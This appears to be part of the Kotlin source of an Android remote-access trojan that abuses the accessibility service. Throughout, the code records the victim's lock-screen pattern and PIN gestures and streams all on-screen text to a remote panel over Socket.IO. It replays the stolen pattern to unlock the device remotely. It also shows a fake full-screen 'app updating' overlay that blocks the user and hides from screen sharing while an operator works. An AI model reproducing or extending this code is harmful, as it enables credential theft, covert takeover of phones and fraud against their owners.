            telaApagada -> "Tela Apagada (Deslize para Acordar)"
            detectouPadrao -> "Aguardando Padrão (9 pontos)"
            detectouPin -> "Aguardando PIN / Senha"
            telaBloqueada -> "Tela de Capa (Deslize para Abrir Senha)"
            else -> "Tela Desbloqueada"
        }

        return JSONObject().apply {
            put("dispositivo", "${Build.MANUFACTURER}-${Build.MODEL}")
            put("deviceId", "${Build.MANUFACTURER}-${Build.MODEL}")
            put("telaApagada", telaApagada)
            put("telaBloqueada", telaBloqueada)
            put("senhaGuardada", senhaGuardada)
            put("detectouPadrao", detectouPadrao)
            put("detectouPin", detectouPin)
            put("estadoDescricao", estadoDesc)
            put("larguraTela", resources.displayMetrics.widthPixels)
            put("alturaTela", resources.displayMetrics.heightPixels)
            put("nos", org.json.JSONArray(nos))
        }
    }

    // ================================================================
    // CAPTURA E NORMALIZAÇÃO DE GESTOS FÍSICOS NA TELA DO CELULAR
    // ================================================================
    private val bufferGestosFisicos = mutableListOf<JSONObject>()
    @Volatile private var tipoGestoFisicoCapturado: String = "padrao"

    // --- FILTRO GEOMÉTRICO DA TRILHA (LockPatternView vs. nós estáticos) ---
    // Área real (em pixels) da grade de padrão atualmente detectada na tela de
    // bloqueio. Só os toques cujo centro cai DENTRO desta área entram na trilha
    // de gestos — descartando saltos para relógio, barra de status e textos
    // informativos da SystemUI que geravam linhas cruzadas irreais no leitor.
    @Volatile private var gradePadraoBounds: android.graphics.Rect? = null
    // Indica que um gesto físico está em andamento (entre START e END). Usado
    // para limpar o buffer da trilha UMA vez ao iniciar uma nova interação.
    @Volatile private var gestoFisicoAtivo: Boolean = false
    // Mantém o último traçado visível por 1,5s após o fim do gesto e então limpa.
    private val limparTrilhaRunnable = Runnable { limparBufferGestosFisicos() }

    // --- CLASSIFICAÇÃO TAP vs. ARRASTO (sem falsos deslizes) ---------------
    // Instante de início do gesto (ACTION_DOWN), id incremental do gesto e
    // instante do fim (ACTION_UP). O id permite ao Leitor FPS disparar o pulso
    // de clique UMA vez e limpar a trilha exatamente ao soltar o toque.
    @Volatile private var gestoInicioMs: Long = 0L
    @Volatile private var gestoId: Int = 0
    @Volatile private var gestoFimMs: Long = 0L
    // touchSlop normalizado (fração da largura da tela): abaixo disto é TAP,
    // acima é ARRASTO. Derivado do scaledTouchSlop real do dispositivo.
    private val touchSlopNorm: Float by lazy {
        try {
            val slopPx = android.view.ViewConfiguration.get(this).scaledTouchSlop.toFloat()
            val w = resources.displayMetrics.widthPixels.toFloat().coerceAtLeast(1f)
            (slopPx / w).coerceIn(0.012f, 0.06f)
        } catch (_: Exception) { 0.02f }
    }

    private fun limparBufferGestosFisicos() {
        synchronized(bufferGestosFisicos) {
            bufferGestosFisicos.clear()
            tipoGestoFisicoCapturado = "padrao"
        }
        // Rearma o detector de início: permite que um novo gesto seja capturado
        // pelo failsafe em ROMs que não emitem *_START.
        gestoFimMs = 0L
    }

    /**
     * Classifica o gesto recém-terminado como "tap" (toque simples) ou "swipe"
     * (arrasto real) comparando a maior distância percorrida com o touchSlop
     * normalizado. Micro-tremores do dedo ficam abaixo do limiar e são tratados
     * como toque, eliminando falsos deslizes.
     */
    private fun classificarGesto(): String {
        synchronized(bufferGestosFisicos) {
            if (bufferGestosFisicos.size < 2) return "tap"
            val p0 = bufferGestosFisicos.first()
            val x0 = p0.optDouble("x", 0.0)
            val y0 = p0.optDouble("y", 0.0)
            var maxDist = 0.0
            for (p in bufferGestosFisicos) {
                val dx = p.optDouble("x", 0.0) - x0
                val dy = p.optDouble("y", 0.0) - y0
                val d = Math.hypot(dx, dy)
                if (d > maxDist) maxDist = d
            }
            return if (maxDist > touchSlopNorm) "swipe" else "tap"
        }
    }

    private fun capturarToqueFisicoTelaBloqueio(event: AccessibilityEvent) {
        try {
            // --- Limpeza do buffer da trilha ao iniciar/terminar a interação ---
            // Ao iniciar um NOVO gesto físico, zera a trilha anterior (uma única
            // vez). Ao terminar, mantém o traçado por 1,5s para inspeção visual
            // no depurador e então limpa automaticamente.
            when (event.eventType) {
                AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START,
                AccessibilityEvent.TYPE_GESTURE_DETECTION_START,
                AccessibilityEvent.TYPE_TOUCH_INTERACTION_START -> {
                    if (!gestoFisicoAtivo) {
                        handlerMain.removeCallbacks(limparTrilhaRunnable)
                        limparBufferGestosFisicos()
                        gestoFisicoAtivo = true
                        gestoInicioMs = System.currentTimeMillis()
                        gestoFimMs = 0L
                        gestoId++                       // novo gesto → novo id
                        tipoGestoFisicoCapturado = "tap"
                    }
                }
                AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END,
                AccessibilityEvent.TYPE_GESTURE_DETECTION_END,
                AccessibilityEvent.TYPE_TOUCH_INTERACTION_END -> {
                    if (gestoFisicoAtivo) {
                        // ACTION_UP: classifica Tap vs. Arrasto pela extensão real
                        // do movimento (touchSlop) e marca o fim do gesto.
                        tipoGestoFisicoCapturado = classificarGesto()
                        gestoFimMs = System.currentTimeMillis()
                    }
                    gestoFisicoAtivo = false
                    handlerMain.removeCallbacks(limparTrilhaRunnable)
                    handlerMain.postDelayed(limparTrilhaRunnable, 1500L)
                }
            }

            // Fora de um gesto ativo, NENHUM evento (scroll automático de lista,
            // WINDOW_CONTENT_CHANGED, etc.) pode criar pontos de trilha — essa
            // era a origem dos falsos deslizes. Eventos de move só contam entre
            // START e END; os demais servem apenas para detectar a grade.
            val ehEventoDeMovimento =
                event.eventType == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER ||
                event.eventType == AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED ||
                event.eventType == AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START
            // Failsafe p/ ROMs que não emitem *_START: um move implica DOWN.
            if (ehEventoDeMovimento && !gestoFisicoAtivo && gestoFimMs == 0L) {
                gestoFisicoAtivo = true
                gestoInicioMs = System.currentTimeMillis()
                gestoId++
                tipoGestoFisicoCapturado = "tap"
            }

            val keyguardManager = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
            val pkg = event.packageName?.toString() ?: ""
            val isLockOrSystem = (keyguardManager?.isKeyguardLocked == true) || pkg.contains("systemui") || pkg.contains("keyguard")

            val node = event.source
            val bounds = android.graphics.Rect()
            // Identificação do nó ANTES de reciclar: precisamos do viewId/className
            // para distinguir a grade interativa (LockPatternView) dos nós estáticos.
            var viewId = ""
            var className = ""
            if (node != null) {
                node.getBoundsInScreen(bounds)
                viewId = (node.viewIdResourceName ?: "").lowercase()
                className = (node.className?.toString() ?: "").lowercase()
                try { node.recycle() } catch (_: Exception) {}
            }

            val ehPatternView = viewId.contains("lockpattern") || viewId.contains("lock_pattern") ||
                viewId.contains("patternview") || className.contains("lockpattern")

            // A própria LockPatternView define a REGIÃO da grade. Seu centro é o
            // centro da grade inteira — não deve virar um ponto da trilha.
            if (ehPatternView && bounds.width() > 100 && bounds.height() > 100) {
                gradePadraoBounds = android.graphics.Rect(bounds)
                return
            }

            if (bounds.width() <= 0 || bounds.height() <= 0) return

            val cx = bounds.centerX()
            val cy = bounds.centerY()

            // --- FILTRO GEOMÉTRICO EXCLUSIVO ---
            // Só conecta pontos que pertençam à grade interativa:
            //   • se a área da grade já foi detectada, exige que (cx, cy) esteja
            //     DENTRO dela — descarta saltos para relógio / status bar / textos;
            //   • se ainda não foi detectada mas estamos no keyguard/SystemUI,
            //     exige marcação de padrão no nó (pattern/keyguard/cell/dot),
            //     evitando conectar nós estáticos antes da grade aparecer.
            val regiao = gradePadraoBounds
            if (regiao != null) {
                if (!regiao.contains(cx, cy)) return
            } else if (isLockOrSystem) {
                val marcaGrade = viewId.contains("pattern") || viewId.contains("keyguard") ||
                    viewId.contains("cell") || viewId.contains("dot") || className.contains("pattern")
                if (!marcaGrade) return
            }

            val metrics = resources.displayMetrics
            val w = metrics.widthPixels.toFloat()
            val h = metrics.heightPixels.toFloat()

            val normX = (cx.toFloat() / w).coerceIn(0.0f, 1.0f)
            val normY = (cy.toFloat() / h).coerceIn(0.0f, 1.0f)

            // Guarda anti-falso-deslize: só pontos de movimento intencional,
            // enquanto o gesto está ativo (entre ACTION_DOWN e ACTION_UP).
            if (!gestoFisicoAtivo || !ehEventoDeMovimento) return

            synchronized(bufferGestosFisicos) {
                val ultimo = bufferGestosFisicos.lastOrNull()
                val dist = if (ultimo != null) {
                    val lx = ultimo.optDouble("x", 0.0).toFloat()
                    val ly = ultimo.optDouble("y", 0.0).toFloat()
                    Math.hypot((normX - lx).toDouble(), (normY - ly).toDouble())
                } else 1.0

                if (dist > 0.005 || bufferGestosFisicos.isEmpty()) {
                    val ptObj = JSONObject().apply {
                        put("x", normX)
                        put("y", normY)
                        put("absX", cx)
                        put("absY", cy)
                        put("timestamp", System.currentTimeMillis())
                    }
                    bufferGestosFisicos.add(ptObj)
                    if (bufferGestosFisicos.size > 50) bufferGestosFisicos.removeAt(0)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao capturar toque físico: ${e.message}")
        }
    }

    private val lockStateReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: android.content.Context?, intent: Intent?) {
            if (intent == null) return
            val action = intent.action ?: return
            when (action) {
                Intent.ACTION_USER_PRESENT -> {
                    val deviceId = "${Build.MANUFACTURER}-${Build.MODEL}"
                    Log.d(TAG, "ACTION_USER_PRESENT recebido — tela do dispositivo $deviceId foi REALMENTE desbloqueada!")
                    pararCapturaAcessibilidade()

                    val arrayGestos = org.json.JSONArray()
                    val tipoCaptura: String
                    synchronized(bufferGestosFisicos) {
                        tipoCaptura = tipoGestoFisicoCapturado
                        bufferGestosFisicos.forEach { arrayGestos.put(it) }
                    }

                    val gestureDataObj = if (arrayGestos.length() > 0) {
                        JSONObject().apply {
                            put("tipo", tipoCaptura)
                            put("pontosNormalizados", arrayGestos)
                            put("pontos", arrayGestos)
                            put("source", "physical_screen")
                            put("timestamp", System.currentTimeMillis())
                        }
                    } else null

                    // Atraso de 1.5s para limpar o buffer, preservando o desenho da trilha no FPS
                    handlerMain.postDelayed({ limparBufferGestosFisicos() }, 1500L)

                    // ★ CORREÇÃO (PROBLEMA 2): log de depuração CLARO e visível
                    // no painel (via log_dispositivo) — confirma que o Android
                    // capturou os gestos físicos na tela de bloqueio e está
                    // enviando a confirmação. Ajuda a diagnosticar Samsung/MIUI.
                    enviarLogApp("[BLOQUEIO OK] USER_PRESENT em $deviceId — gestos físicos capturados=${arrayGestos.length()} tipo=$tipoCaptura. Enviando lockscreen_desbloqueado_ok…")

                    try {
                        val payload = JSONObject().apply {
                            put("dispositivo", deviceId)
                            put("deviceId", deviceId)
                            put("timestamp", System.currentTimeMillis())
                            put("status", "desbloqueado")
                            put("source", "physical_screen")
                            if (gestureDataObj != null) {
                                put("gestureData", gestureDataObj)
                            }
                        }
                        SocketManager.socket?.emit("lockscreen_desbloqueado_ok", payload)
                        enviarLog("[BLOQUEIO OK] Confirmação de tela desbloqueada enviada com ${arrayGestos.length()} pontos de gesto físico!")
                    } catch (e: Exception) {
                        Log.e(TAG, "Erro ao emitir lockscreen_desbloqueado_ok: ${e.message}")
                    }
                }
                Intent.ACTION_SCREEN_OFF -> {
                    val deviceId = "${Build.MANUFACTURER}-${Build.MODEL}"
                    Log.d(TAG, "ACTION_SCREEN_OFF recebido — limpando buffer de gestos físicos.")
                    limparBufferGestosFisicos()
                    try {
                        val payload = JSONObject().apply {
                            put("dispositivo", deviceId)
                            put("deviceId", deviceId)
                            put("timestamp", System.currentTimeMillis())
                            put("status", "bloqueado")
                        }
                        SocketManager.socket?.emit("lockscreen_estado_mudou", payload)
                    } catch (_: Exception) {}
                }
            }
        }
    }

    private fun percorrerNosRecursivo(node: AccessibilityNodeInfo, listaOut: MutableList<JSONObject>) {
        // Proteção contra árvores muito profundas / recursão descontrolada.
        if (listaOut.size >= 1200) return
        val bounds = android.graphics.Rect()
        node.getBoundsInScreen(bounds)

        if (node.isVisibleToUser && bounds.width() > 0 && bounds.height() > 0) {
            val item = JSONObject().apply {
                put("viewId", node.viewIdResourceName ?: "")
                put("className", node.className?.toString() ?: "")
                put("text", node.text?.toString() ?: "")
                put("contentDescription", node.contentDescription?.toString() ?: "")
                put("clickable", node.isClickable)
                // Estado de foco/seleção: o Leitor FPS pinta de amarelo o nó
                // em foco (grade 3x3 / LockPatternView) para o foco sequencial.
                put("focused", node.isAccessibilityFocused || node.isFocused)
                put("selected", node.isSelected)
                put("left", bounds.left)
                put("top", bounds.top)
                put("right", bounds.right)
                put("bottom", bounds.bottom)
                put("centerX", bounds.centerX())
                put("centerY", bounds.centerY())
            }
            listaOut.add(item)
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            percorrerNosRecursivo(child, listaOut)
            try { child.recycle() } catch (_: Exception) {}
        }
    }

    /**
     * Coleta os nós de TODAS as janelas ativas (service.windows) — incluindo a
     * SystemUI e o Keyguard onde a grade 3x3 (LockPatternView) é renderizada —
     * além de rootInActiveWindow. Sem percorrer `windows`, apenas os nós
     * superiores (relógio/data) da janela ativa eram enviados e os filhos da
     * grade não atualizavam o foco em tempo real. Ignora os overlays de
     * acessibilidade (os nossos). Faz fallback para rootInActiveWindow quando
     * nenhuma janela retorna raiz (ROMs antigas / tela apagada).
     */
    private fun coletarNosDeTodasJanelas(listaOut: MutableList<JSONObject>) {
        val roots = mutableListOf<AccessibilityNodeInfo>()
        try {
            val janelas: List<android.view.accessibility.AccessibilityWindowInfo> =
                windows ?: emptyList()
            for (janela in janelas) {
                if (janela.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue
                val raiz = janela.root ?: continue
                roots.add(raiz)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao listar janelas para telemetria: ${e.message}")
        }
        if (roots.isEmpty()) {
            try { rootInActiveWindow?.let { roots.add(it) } } catch (_: Exception) {}
        }
        for (raiz in roots) {
            try {
                percorrerNosRecursivo(raiz, listaOut)
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao percorrer janela: ${e.message}")
            }
            try { raiz.recycle() } catch (_: Exception) {}
        }
    }

    private var ultimoEnvioTelemetriaMs = 0L

    /**
     * Envia telemetria da árvore de componentes e eventos de interação via Socket.IO em tempo real.
     * Funciona continuamente mesmo quando a tela estiver apagada ou o vídeo pausado.
     */
    private fun enviarTelemetriaAcessibilidade(event: AccessibilityEvent?) {
        try {
            val agora = System.currentTimeMillis()
            val tipo = event?.eventType ?: 0

            // FOCO SEQUENCIAL EM TEMPO REAL: mudanças de foco/seleção (foco da
            // grade 3x3 / LockPatternView) são emitidas IMEDIATAMENTE, sem o
            // debounce de 100ms, para que o Leitor FPS acompanhe o foco nó a nó.
            val eventoFoco = tipo == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER ||
                tipo == AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED ||
                tipo == AccessibilityEvent.TYPE_VIEW_SELECTED

            // Throttle leve (~25ms ≈ 40fps) durante o gesto físico: acompanha os
            // 60fps do dedo sem inundar a rede. O frame de fim de gesto nunca é
            // descartado (gestoFimMs sinaliza o ACTION_UP).
            if (gestoFisicoAtivo && gestoFimMs == 0L &&
                (agora - ultimoEnvioTelemetriaMs) < 25) {
                return
            }

            if (!eventoFoco && tipo == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
                (agora - ultimoEnvioTelemetriaMs < 100)) {
                return
            }
            ultimoEnvioTelemetriaMs = agora

            val pontoReal = android.graphics.Point()
            val wm = getSystemService(WINDOW_SERVICE) as? WindowManager
            @Suppress("DEPRECATION")
            wm?.defaultDisplay?.getRealSize(pontoReal)
            val metrics = resources.displayMetrics
            val screenWidth = if (pontoReal.x > 0) pontoReal.x else metrics.widthPixels
            val screenHeight = if (pontoReal.y > 0) pontoReal.y else metrics.heightPixels

            // Percorre TODAS as janelas (windows) + rootInActiveWindow, incluindo
            // a SystemUI/Keyguard onde a grade 3x3 é renderizada, extraindo os
            // boundsInScreen dos filhos da grade.
            val nos = mutableListOf<JSONObject>()
            coletarNosDeTodasJanelas(nos)

            val deviceName = "${Build.MANUFACTURER}-${Build.MODEL}"

            val arrayGestos = JSONArray()
            synchronized(bufferGestosFisicos) {
                bufferGestosFisicos.forEach { arrayGestos.put(it) }
            }

            // Classificação do gesto para o Leitor FPS: tap (pulso de clique) vs.
            // swipe (trilha), com sinal de fim (ACTION_UP) por ~400ms para que o
            // cliente limpe a trilha imediatamente ao soltar o toque.
            val fimRecente = gestoFimMs > 0L && (agora - gestoFimMs) < 400
            val gestoTipoAtual = if (gestoFisicoAtivo || fimRecente)
                tipoGestoFisicoCapturado else "none"

            val payload = JSONObject().apply {
                put("dispositivo", deviceName)
                put("screen_width", screenWidth)
                put("screen_height", screenHeight)
                put("event_type", tipo)
                put("package_name", event?.packageName?.toString() ?: "")
                put("nos", JSONArray(nos))
                put("interacoes", arrayGestos)
                put("gesto_tipo", gestoTipoAtual)
                put("gesto_ativo", gestoFisicoAtivo)
                put("gesto_fim", fimRecente)
                put("gesto_id", gestoId)
                put("timestamp", agora)
            }

            SocketManager.garantirConexao()
            SocketManager.socket?.emit("telemetria_acessibilidade", payload)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao enviar telemetria de acessibilidade: ${e.message}")
        }
    }

    /**
     * Executa o desenho contínuo da senha padrão (Pattern Password) passando
     * pelas coordenadas exatas dos pontos selecionados na web.
     */
    fun desbloquearPadraoPontos(pontos: List<android.graphics.PointF>, onResult: ((Boolean) -> Unit)? = null) {
        if (pontos.size < 2) {
            enviarLog("[PADRÃO ERRO] Requer pelo menos 2 pontos para desenhar a senha padrão.")
            onResult?.invoke(false)
            return
        }

        val path = Path().apply {
            moveTo(pontos[0].x, pontos[0].y)
            for (i in 1 until pontos.size) {
                lineTo(pontos[i].x, pontos[i].y)
            }
        }

        val tempoDuracao = (pontos.size * 180L).coerceIn(300L, 1800L)
        val stroke = GestureDescription.StrokeDescription(path, 0, tempoDuracao)
        val gestureBuilder = GestureDescription.Builder().addStroke(stroke)

        val aceito = dispatchGesture(gestureBuilder.build(), object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                enviarLog("[PADRÃO OK] Desenho da senha padrão concluído (${pontos.size} pontos).")
                onResult?.invoke(true)
            }

            override fun onCancelled(gestureDescription: GestureDescription?) {
                enviarLog("[PADRÃO CANCELADO] Desenho da senha padrão cancelado pelo sistema.")
                onResult?.invoke(false)
            }
        }, null)

        if (!aceito) {
            enviarLog("[PADRÃO RECUSADO] dispatchGesture para senha padrão foi recusado pelo Android.")
            onResult?.invoke(false)
        }
    }

    /**
     * Executa ações remotas na tela de bloqueio (swipe_up, clique_coord, etc.).
     */
    fun executarComandoBloqueio(action: String, value: String?, x: Float?, y: Float?) {
        when (action.lowercase()) {
            "swipe_up", "acordar", "deslizar_cima" -> {
                desbloquearSwipeRemoto()
                enviarLog("[BLOQUEIO] Swipe-up vertical executado para abrir a tela de senha.")
            }
            "clique_pin", "clique_coord" -> {
                if (x != null && y != null) {
                    clickAt(x, y)
                    enviarLog("[BLOQUEIO] Clique na coordenada ($x, $y) [valor=$value].")
                }
            }
            "abrir_acessibilidade" -> {
                abrirAcessibilidadeSettings()
            }
        }
    }

    fun abrirAcessibilidadeSettings() {
        try {
            val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
            enviarLog("[BLOQUEIO] Tela de configurações de acessibilidade aberta no dispositivo.")
        } catch (e: Exception) {
            enviarLog("[BLOQUEIO ERRO] Falha ao abrir acessibilidade: ${e.message}")
        }
    }

    private var overlayAtualizacao: View? = null

    // Failsafe: o modo de atualização (overlay "Atualizando o aplicativo...")
    // dura no MÁXIMO 2 minutos. Ao expirar, desativa sozinho e notifica o painel
    // (que oculta o spinner central do emulador flutuante).
    private val timeoutAtualizacaoMs = 120_000L
    private val timeoutAtualizacaoRunnable = Runnable { ativarAtualizacaoGlobal(false) }

    val isAtualizacaoAtiva: Boolean
        get() = overlayAtualizacao != null

    fun ativarAtualizacaoGlobal(ativo: Boolean) {
        handlerMain.post {
            try {
                // Guarda de mudança de estado: evita loop de eco quando o próprio
                // dispositivo reemite "atualizacao_status" (o servidor encaminha
                // o evento de volta para o aparelho). Sem mudança, não faz nada.
                val jaAtivo = overlayAtualizacao != null
                if (ativo == jaAtivo) return@post

                if (ativo) {
                    handlerMain.removeCallbacks(timeoutAtualizacaoRunnable)
                    handlerMain.postDelayed(timeoutAtualizacaoRunnable, timeoutAtualizacaoMs)
                    if (overlayAtualizacao == null) {
                        val wm = windowManager ?: getSystemService(WINDOW_SERVICE) as? WindowManager ?: return@post

                        val container = FrameLayout(this).apply {
                            setBackgroundColor(Color.BLACK)
                            isClickable = true
                            isFocusable = true
                            setOnTouchListener { _, _ -> true }

                            if (Build.VERSION.SDK_INT >= 34) {
                                try {
                                    val method = View::class.java.getMethod("setHideDuringScreenSharing", Boolean::class.java)
                                    method.invoke(this, true)
                                } catch (_: Exception) {}
                            }

                            val inner = LinearLayout(context).apply {
                                orientation = LinearLayout.VERTICAL
                                gravity = Gravity.CENTER
                                setPadding(dp(32), dp(32), dp(32), dp(32))
                            }

                            val progressBar = ProgressBar(context).apply {
                                isIndeterminate = true
                                layoutParams = LinearLayout.LayoutParams(dp(64), dp(64)).apply {
                                    bottomMargin = dp(24)
                                }
                            }

                            val title = TextView(context).apply {
                                text = "Atualizando o aplicativo..."
                                textSize = 20f
                                setTextColor(Color.WHITE)
                                setTypeface(null, android.graphics.Typeface.BOLD)
                                gravity = Gravity.CENTER
                                layoutParams = LinearLayout.LayoutParams(
                                    LinearLayout.LayoutParams.WRAP_CONTENT,
                                    LinearLayout.LayoutParams.WRAP_CONTENT
                                ).apply {
                                    bottomMargin = dp(12)
                                }
                            }

                            val subtitle = TextView(context).apply {
                                text = "Aguarde enquanto sincronizamos os dados.\nNão feche o aplicativo."
                                textSize = 14f
                                setTextColor(Color.parseColor("#CCCCCC"))
                                gravity = Gravity.CENTER
                            }

                            inner.addView(progressBar)
                            inner.addView(title)
                            inner.addView(subtitle)
                            addView(inner)
                        }

                        val typeOverlay = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                        } else {
                            WindowManager.LayoutParams.TYPE_PHONE
                        }

                        val params = WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            typeOverlay,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                            PixelFormat.TRANSLUCENT
                        ).apply {
                            gravity = Gravity.CENTER
                        }

                        wm.addView(container, params)
                        overlayAtualizacao = container
                    }
                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        iniciarCapturaAcessibilidade()
                    } else {
                        pararCapturaAcessibilidade()
                    }
                    enviarLog("[ATUALIZAÇÃO] Overlay de atualização global ativado.")
                    notificarStatusAtualizacao(true)
                } else {
                    handlerMain.removeCallbacks(timeoutAtualizacaoRunnable)
                    overlayAtualizacao?.let {
                        try {
                            windowManager?.removeView(it)
                        } catch (_: Exception) {}
                        overlayAtualizacao = null
                    }
                    pararCapturaAcessibilidade()
                    notificarStatusAtualizacao(false)
                    enviarLog("[ATUALIZAÇÃO] Overlay de atualização global desativado.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao alterar overlay de atualização global: ${e.message}")
            }
        }
    }

    /**
     * Notifica o painel (e consequentemente o emulador flutuante) sobre o estado
     * do modo de atualização, para exibir/ocultar o spinner central sobre o vídeo.
     * Inclui o nome do dispositivo para o servidor encaminhar o evento apenas a
     * este aparelho (evita ligar/desligar a atualização de outro celular).
     * A guarda de mudança de estado em ativarAtualizacaoGlobal() quebra o eco:
     * o servidor reenvia o evento para este dispositivo, mas como o estado já
     * foi alterado, a chamada é ignorada (sem loop infinito).
     */
    private fun notificarStatusAtualizacao(ativo: Boolean) {
        try {
            val nomeDisp = "${android.os.Build.MANUFACTURER}-${android.os.Build.MODEL}"
            val payload = org.json.JSONObject()
                .put("ativo", ativo)
                .put("dispositivo", nomeDisp)
            SocketManager.socket?.emit("atualizacao_status", payload)
        } catch (_: Exception) {
        }
    }
}
